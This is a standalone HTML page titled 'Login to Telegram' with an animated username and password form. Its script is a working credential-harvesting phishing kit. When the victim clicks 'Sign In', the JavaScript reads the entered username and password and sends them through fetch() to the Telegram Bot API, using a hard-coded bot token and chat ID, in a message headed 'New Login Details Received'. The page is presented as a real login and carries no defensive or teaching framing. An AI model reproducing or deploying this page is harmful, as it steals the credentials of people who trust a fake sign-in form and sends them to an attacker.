<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login to Telegram</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      font-family: 'Segoe UI', sans-serif;
    }
    .login-box {
      width: 350px;
      padding: 40px;
      background: #111;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0,255,255,0.4);
      border: 2px solid transparent;
      animation: rgb-glow 5s linear infinite;
    }
    @keyframes rgb-glow {
      0% { border-color: red; }
      25% { border-color: blue; }
      50% { border-color: lime; }
      75% { border-color: cyan; }
      100% { border-color: red; }
    }
    .login-box h2 {
      color: #fff;
      text-align: center;
      margin-bottom: 30px;
    }
    .input-box {
      margin-bottom: 20px;
    }
    .input-box input {
      width: 100%;
      padding: 12px;
      background: #222;
      border: 2px solid #0ff;
      outline: none;
      border-radius: 8px;
      color: #fff;
      font-size: 16px;
    }
    .input-box label {
      color: #0ff;
      font-size: 14px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: linear-gradient(270deg, red, blue, lime, cyan, red);
      background-size: 600% 600%;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      animation: rgb-move 5s infinite ease-in-out;
      box-shadow: 0 0 15px rgba(0,255,255,0.6);
    }
    @keyframes rgb-move {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .forgot {
      text-align: right;
      margin-top: 10px;
    }
    .forgot a {
      color: #0ff;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login</h2>
    <div class="input-box">
      <label>Username</label>
      <input type="text" id="username" placeholder="Enter username" required>
    </div>
    <div class="input-box">
      <label>Password</label>
      <input type="password" id="password" placeholder="Enter password" required>
    </div>
    <button class="btn" onclick="sendToTelegram()">Sign In</button>
    <div class="forgot">
      <a href="#">Forgot Password?</a>
    </div>
  </div>

  <script>
    function sendToTelegram() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const message = `ðŸ” *New Login Details Received:*\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}`;

      const token = "7641600096:AAF2KShllYD6MKx2rZ_aIOwqDdF4hi1rJTc6861912709";  // Your Bot Token
      const chatId = "7641600096"; // Your Telegram Chat ID

      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(res => {
        if (res.ok) {
          alert("Login details sent to Telegram!");
        } else {
          alert("Failed to send message.");
        }
      })
      .catch(err => alert("Error: " + err));
    }
  </script>
</body>
</html>
